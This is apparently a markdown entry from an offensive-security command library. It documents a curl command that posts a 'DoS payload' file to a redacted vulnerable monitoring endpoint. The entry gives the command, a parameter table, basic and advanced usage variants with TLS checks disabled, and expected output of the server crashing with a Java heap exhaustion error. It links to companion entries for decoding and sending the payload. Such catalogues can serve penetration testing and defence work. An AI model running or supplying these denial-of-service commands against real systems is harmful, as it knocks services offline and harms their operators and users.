---
id: cmd-curl-dos
data: 'curl https://███████/monitor/EXPROD_1 --data-binary @payload_dos -k'
tags:
  - dos
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.646Z'
verified: false
validated: true
submitted: true
---
# curl-send-dos-payload

## Command

```bash
curl https://███████/monitor/EXPROD_1 --data-binary @payload_dos -k
```

## Description

Sends the DoS binary payload as POST data to the vulnerable endpoint, ignoring SSL certificate errors, to cause Java heap space exhaustion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| https://███████/monitor/EXPROD_1 | Target URL | Yes |
| --data-binary | Sends file as binary data | Yes |
| @payload_dos | Reads DoS payload from file | Yes |
| -k | Insecure mode, skips SSL verification | Yes |

## Examples

### Basic Usage

```bash
curl https://target/monitor/EXPROD_1 --data-binary @payload_dos -k
```

### Advanced Usage

```bash
curl -X POST https://target/endpoint --data-binary @payload_dos -k -v
```

## Expected Output

HTTP/1.1 200 OK
<response>
Server crashes with 'java.lang.OutOfMemoryError: Java heap space'.

## Related

- [[commands/echo-decode-dos-payload]]
- [[procedures/Send-DoS-Payload-to-Endpoint]]
